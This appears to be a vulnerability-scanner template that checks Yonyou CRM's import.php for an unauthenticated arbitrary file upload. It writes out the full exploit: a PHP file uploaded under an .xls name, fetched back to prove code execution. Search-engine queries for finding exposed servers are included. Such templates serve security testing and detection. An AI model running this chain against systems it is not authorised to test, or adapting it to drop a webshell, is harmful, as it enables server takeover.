http:
- matchers:
  - part: body
    type: word
    words:
    - '{{result}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary={{boundary}}


    --{{boundary}}

    Content-Disposition: form-data; name="xfile"; filename="11.xls"


    <?php print({{num1}}*{{num2}});unlink(__FILE__);?>

    --{{boundary}}

    Content-Disposition: form-data; name="combo"


    {{filename}}

    --{{boundary}}--

    '
  - 'GET /tmpfile/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: yonyou-crm-import-file-upload
info:
  author: Co5mos
  description: "\u7528\u53CBCRM\u5BA2\u6237\u5173\u7CFB\u7BA1\u7406\u7CFB\u7EDF\u7684\
    import.php\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u672A\
    \u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\
    \u8BE5\u6F0F\u6D1E\u4E0A\u4F20webshell\u6587\u4EF6\uFF0C\u4ECE\u800C\u83B7\u53D6\
    \u5230\u670D\u52A1\u5668\u6743\u9650\u3002\n"
  metadata:
    fofa-query: "body=\"\u7528\u53CBU8CRM\""
    hunter-query: "app.name=\"\u7528\u53CB CRM\""
  name: Yonyou CRM import.php Arbitrary File Upload
  severity: critical
  tags: yonyou, crm, file-upload
variables:
  boundary: '{{rand_base(20)}}'
  filename: '{{rand_base(6)}}.php'
  num1: '{{rand_int(10000, 20000)}}'
  num2: '{{rand_int(10000, 20000)}}'
  result: '{{to_number(num1)*to_number(num2)}}'
